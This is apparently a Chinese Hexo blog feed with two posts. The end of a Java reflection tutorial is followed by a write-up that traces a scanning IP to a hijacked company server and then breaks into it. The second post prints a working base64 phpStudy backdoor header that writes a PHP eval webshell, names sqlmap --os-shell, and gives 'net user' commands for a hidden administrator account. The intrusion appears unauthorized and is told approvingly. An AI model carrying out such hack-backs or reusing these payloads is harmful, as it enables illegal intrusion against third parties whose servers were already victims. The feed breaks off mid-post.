class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Field实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-5.png" title="Field实现"></p><h3 id="3、Method访问成员方法"><a href="#3、Method访问成员方法" class="headerlink" title="3、Method访问成员方法"></a>3、Method访问成员方法</h3><p>要动态获取一个对象方法的信息，首先需要通过下列方法之一创建一个<code>Method</code>类型的对象或者数组。<br><strong>Method声明使用的方法</strong></p><table><thead><tr><th align="center">Method声明使用的方法</th><th align="left">注解</th></tr></thead><tbody><tr><td align="center">getMethods()</td><td align="left">获取所有权限为public的成员方法</td></tr><tr><td align="center">getMethods(String name,Class&lt;?&gt; …parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr><tr><td align="center">getDeclaredMethods()</td><td align="left">获取的成员所有的方法</td></tr><tr><td align="center">getDeclaredMethods(String name,Class&lt;?&gt;…parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr></tbody></table><p>注：针对private私有的方法，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有方法</p><p><strong>Method常用方法</strong></p><table><thead><tr><th align="center">静态方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获取该方法的名称</td></tr><tr><td align="center">getParameterType()</td><td align="left">按照声明顺序以 Class 数组的形式返回该方法各个参数的类型</td></tr><tr><td align="center">getReturnType()</td><td align="left">以 Class 对象的形式获得该方法的返回值类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获得该方法可能抛出的异常类型</td></tr><tr><td align="center">invoke(Object obj,Object…args)</td><td align="left">利用 args 参数执行指定对象 obj 中的该方法，返回值为 Object 类型</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该方法是否允许带有可变数量的参数，如果允许返回 true，否则返回 false</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public void setinfo(String name,String phone,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.phone=phone;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public String show()&#123;</span><br><span class="line">        return &quot;&#123;name:&quot;+name+&quot;;age:&quot;+age+&quot;;phone:&quot;+phone+&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        //Method访问成员setinfo()方法并传参设置变量值</span><br><span class="line">        Method mt=people1.getDeclaredMethod(&quot;setinfo&quot;, String.class, String.class, int.class);</span><br><span class="line">        //Method调用方法传参</span><br><span class="line">        Object mtobj=mt.invoke(obj,&quot;张三&quot;,&quot;13011111111&quot;,18);</span><br><span class="line">        //Method访问成员show()方法</span><br><span class="line">        Method mt2=people1.getDeclaredMethod(&quot;show&quot;);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Method实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-6.png" title="Method实现"></p><h3 id="4、Constructor访问成员构造方法"><a href="#4、Constructor访问成员构造方法" class="headerlink" title="4、Constructor访问成员构造方法"></a>4、Constructor访问成员构造方法</h3><p>为了能够动态获取对象构造方法的信息，首先需要通过下列方法之一创建一个 Constructor 类型的对象或者数组。<br><strong>Constructor声明使用的方法</strong></p><table><thead><tr><th align="center">Constructor声明使用的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取所有权限为public的构造方法</td></tr><tr><td align="center">getDeclaredConstructors()</td><td align="center">获取当前对象的所有构造方法</td></tr><tr><td align="center">getDeclaredConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取当前对象所有带参数类型的构造方法</td></tr></tbody></table><p><strong>Constructor常用的方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">public String getName()</td><td align="left">返回构造方法名</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该构造方法是否允许带可变数量的参数，如果允许，返回 true，否则返回false</td></tr><tr><td align="center">getParameterTypes()</td><td align="left">按照声明顺序以 Class 数组的形式获取该构造方法各个参数的类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获取该构造方法可能抛出的异常类型</td></tr><tr><td align="center">newInstance(Object … initargs)</td><td align="left">通过该构造方法利用指定参数创建一个该类型的对象，如果未设置参数则表示采用默认无参的构造方法</td></tr><tr><td align="center">setAccessiable(boolean flag)</td><td align="left">如果该构造方法的权限为 private，默认为不允许通过反射利用 netlnstance()方法创建对象。如果先执行该方法，并将入口参数设置为 true，则允许创建对象</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该构造方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public void setinfo(String name,String phone,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.phone=phone;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public people()&#123;</span><br><span class="line">        System.out.print(&quot;调用了无参构造方法：&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public people(String name,String phone,int age)&#123;</span><br><span class="line">        setinfo(name,phone,age);</span><br><span class="line">        System.out.print(&quot;调用了带参数的构造方法：&quot;+show());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String show()&#123;</span><br><span class="line">        return &quot;&#123;name:&quot;+name+&quot;;age:&quot;+age+&quot;;phone:&quot;+phone+&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //三种获取类的方式</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line"></span><br><span class="line">        //进行反射类实例化</span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        //System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        //Field访问成员变量</span><br><span class="line">        //反射获取类变量</span><br><span class="line">        Field A=people1.getDeclaredField(&quot;name&quot;);</span><br><span class="line">        //由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span><br><span class="line">        A.setAccessible(true);</span><br><span class="line">        //反射设置类中的变量值</span><br><span class="line">        A.set(obj,&quot;张三&quot;);</span><br><span class="line">        //输出该obj对象中变量的变量值</span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        //Method访问成员setinfo()方法并传参设置变量值</span><br><span class="line">        Method mt=people1.getDeclaredMethod(&quot;setinfo&quot;, String.class, String.class, int.class);</span><br><span class="line">        //Method调用方法传参</span><br><span class="line">        Object mtobj=mt.invoke(obj,&quot;张三&quot;,&quot;13011111111&quot;,18);</span><br><span class="line">        //Method访问成员show()方法</span><br><span class="line">        Method mt2=people1.getDeclaredMethod(&quot;show&quot;);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;----------分割线--------&quot;);</span><br><span class="line"></span><br><span class="line">        //Constructor访问成员构造方法</span><br><span class="line">        //方法一、通过newInstance()调用无参构造方法</span><br><span class="line">        Object obj2=people1.newInstance();</span><br><span class="line">        System.out.println(&quot; 方法一：直接通过newInstance()调用无参构造方法&quot;);</span><br><span class="line">        //方法二、通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法</span><br><span class="line">        Constructor ct=people1.getDeclaredConstructor(String.class, String.class, int.class);</span><br><span class="line">        Object obj3=ct.newInstance(&quot;张四&quot;,&quot;13022222222&quot;,19);</span><br><span class="line">        System.out.println(&quot; 方法二：通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法&quot;);</span><br><span class="line">        //方法三、通过getDeclaredConstructor()调用无参构造方法</span><br><span class="line">        Constructor ct2=people1.getDeclaredConstructor();</span><br><span class="line">        Object obj4=ct2.newInstance();</span><br><span class="line">        System.out.println(&quot; 方法三：通过getDeclaredConstructor()调用无参构造方法&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Constructor实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-7.png" title="Constructor实现"></p><h1 id="0x02、思考"><a href="#0x02、思考" class="headerlink" title="0x02、思考"></a>0x02、思考</h1><p>Java反射是真的累啊看下来，为了实现动态对类的操作，绕了很大一圈，多出来很多代码去实现这个功能，但确实使用反射很大程度降低了代码之间的依赖性，实现动态加载。<br>java反射核心想法就是：突破常规访问限制，就是为了动态访问类。<br>导致的安全问题也是因为突破常规访问限制，利用反射去访问对象以及篡改变量值包括一些私有属性的变量。</p><h1 id="0x03、参考链接"><a href="#0x03、参考链接" class="headerlink" title="0x03、参考链接"></a>0x03、参考链接</h1><p><a href="http://c.biancheng.net/view/6907.html">http://c.biancheng.net/view/6907.html</a><br><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次普通的攻击溯源排查</title>
      <link href="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/"/>
      <url>/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>一次恶意扫描触发的告警，溯源排查攻击源IP，简单记一下这次的溯源排查流程。</p><h2 id="0x01、告警"><a href="#0x01、告警" class="headerlink" title="0x01、告警"></a>0x01、告警</h2><p>可以看是<font color=red>同一时间</font>的告警，受害IP为该C段下的三台业务服务器，触发的三条告警，可直接判断为<font color=red>恶意扫描</font>。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-1.png" title="告警"><br>查看攻击流量http报文，可看到phpstudy的后门利用payload，排除误报。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-2.png" title="告警报文"><br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/gj-3.png" title="告警payload"> </p><h2 id="0x02、溯源排查"><a href="#0x02、溯源排查" class="headerlink" title="0x02、溯源排查"></a>0x02、溯源排查</h2><p>针对攻击源IP，进行常规溯源流程（威胁情报、域名反查、IP端口开放情况、可利用的漏洞等）</p><h3 id="攻击源IP情况："><a href="#攻击源IP情况：" class="headerlink" title="攻击源IP情况："></a>攻击源IP情况：</h3><p>直接丢ti、微步、360威胁情报同理，取有用信息。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-1.png" title="威胁情报"><br>攻击源ip：绵阳阿里云<br>有用信息就只有反查域名，注册过m.xxx.cn，还有一些其他域名，查了没啥有用的。<br>查看m.xxx.cn域名信息，该域名为一家装饰公司备案的，也有备案号。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-2.png" title="域名查询"><br>同时ping该域名也是正常解析到攻击源IP上的，说明当前域名与攻击IP是绑定匹配的，时效期内。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-3.png" title="域名IP绑定"><br>同时威胁情报也能看到对应开放的端口，但大部分时效性不强，可以结合fofa查看或者自己扫描攻击源IP开放的端口。<br>扫描查看到攻击源IP开放了80、3389、8085等端口。<br>访问web页面，访问跳转&#x2F;index2.php页面，标题为屠龙之怒，与该公司名称xx装饰集团四川有限公司业务不符，疑为该公司网站被挂黑链，服务器被当作跳板对外发出恶意扫描。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/pc-4.png" title="web应用"> </p><p>攻击源IP简述:<br>1、绵阳阿里云服务器<br>2、注册域名为m.xxx.cn，为某装修公司，域名与IP绑定匹配。<br>3、web应用跳转游戏，疑似被挂黑页，疑为肉鸡。</p><h3 id="攻击源IP反制："><a href="#攻击源IP反制：" class="headerlink" title="攻击源IP反制："></a>攻击源IP反制：</h3><p>一来就看游戏入口去了，一个游戏页面，简单抓了包<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-1.jpg" title="登录"><br>存在用户，但没啥关系，存在sql注入，查看了库，只有test库（&#x2F;不对劲，交互连接的库名不是这个），但不能查询内容。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-2.png" title="sql注入"><br>–os-shell一把嗦。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-3.jpg" title="sql注入"><br>权限不够，权限不足，–file-read啥的也是没权限直接过。<br>于此同时目录也早扫完了，查看了一下，看到早就已经被挂了马了，肉鸡没跑了。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-4.png" title="目录扫描"><br>查看了下漏扫结果，存在phpstudy后门，才反应过来本来就是肉鸡，一个劲对外扫phpstudy后门，黑页的游戏也是phpstudy部署的，本身就有后门<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-5.png" title="漏洞扫描"><br>顺其自然通过Phpstudy后门写文件获取shell<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-6.png" title="payload"><br>手工直接请求头添加下面payload即可，同时删除原本的Accept-Encoding改成下面的，&#x2F;&#x2F;开始忘删了导致没生效，蠢死。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInVwZGF0ZSJdKT9ePj5DOlxMVF9TZXJ2ZXJccGhwU3R1ZHlcV1dXXHVwZGF0ZTF0ZXN0LnBocCcpOw==</span><br></pre></td></tr></table></figure><p><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/fz-7.png" title="发送payload"> </p><h3 id="攻击源IP服务器分析："><a href="#攻击源IP服务器分析：" class="headerlink" title="攻击源IP服务器分析："></a>攻击源IP服务器分析：</h3><p>其中查看数据发现系统存在可见内最早的webshell为2019-10-15日,文件名为test.php(不确定是否为文件真正上传建立的日期)<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-1.png" title="webshell"><br>以及2022-10-10 01:28创建的webshell，文件名称为phpshell.php，同时期上传的cs马<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-2.png" title="webshell"><br>但该攻击者未进行其他的相关操作，仅获取服务器权限后看了一下，未发现其他操作。<br>于此同时，发现被添加的影子账户loxxxxo$,并且在这个影子账户的桌面上传了phpstudy的批量扫描后门利用工具，以及一些扫描记录和扫描的目标网段<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-3.png" title="记录"><br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-4.png" title="记录"><br>通过创建影子账户登录服务器，本身就开了3389，就不用再开启端口了<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-5.png" title="创建账户"> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /add  //添加管理员账户</span><br><span class="line">net localgroup administrators xxx /add  //将添加的管理员账户加入管理员组</span><br></pre></td></tr></table></figure><p>利用工具的一些扫描记录<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/sy-6.png" title="利用工具"><br>同时该影子用户还上传了一些黑灰产软件，运行挂起获取收益<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-1.png" title="挂起收益"><br>一个月内获得的积分收益<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-2.png" title="挂起收益"> </p><h3 